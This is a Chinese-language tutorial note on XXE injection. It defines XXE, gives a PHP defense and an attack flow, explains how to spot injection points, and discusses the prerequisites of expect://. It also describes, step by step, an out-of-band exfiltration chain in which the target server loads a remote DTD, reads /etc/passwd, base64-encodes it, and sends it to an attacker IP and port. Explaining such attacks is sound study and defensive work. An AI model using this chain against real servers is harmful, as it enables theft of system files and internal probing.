XXE（XML Enternal Entity Injection，XML外部实体注入）

XML解析器解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。

防御方法:
禁用外部实体(PHP:可以将libxml_disable_entity_loader设置为TRUE来禁用外部实体)

其他的语言也可以使用这个方法进行防御。

1.攻击流程

发现XML输入点 → 构造恶意XML（含外部实体） → 服务器解析XML → 触发外部实体加载（读取文件/访问内网） → 获取数据/探测信息

判断注入点：

1.查看网站源代码

2.查看HTTP的Request报文中是否出现Content-type:text/xml application/xml

强依赖 PHP 环境： expect:// 协议是 PHP 特有的（严格来说是 PHP 的 PECL 扩展）。

非默认自带扩展： expect 不是 PHP 核心自带的扩展，必须由管理员手动通过 pecl install expect 安装，并在 php.ini 中明确启用。在实际业务中，极少有业务开发需要用到这个扩展。

XXE 本身在被消亡： 现代的 XML 解析器（如高版本的 libxml2）在默认情况下已经全面禁用了外部实体解析（DTD/External Entities）。现在能挖到一个普通的 XXE 已经不易，更遑论后面一连串的严苛条件。

第三步：服务器内部发生的“化学反应”

当目标服务器收到这段 XML 后，它的解析器会经历以下心路历程：

  1. 加载外部 DTD：服务器看到 %remote，于是乖乖地去访问 http://47.95.x.x/test.dtd 并下载。
  2. 读取文件：解析 test.dtd 时，发现 %file 实体要求读取 /etc/passwd。服务器在本地执行读取操作，并将其转换为 Base64 字符串（例如：cm9vdDp4OjA6...）。
  3. 动态拼接：解析 %eval。这时服务器在内存中动态生成了一个名为 %exfiltrate 的实体。
  4. 发起请求：最后执行 %exfiltrate;。服务器会尝试访问： http://47.95.x.x:8080/?data=cm9vdDp4OjA6...
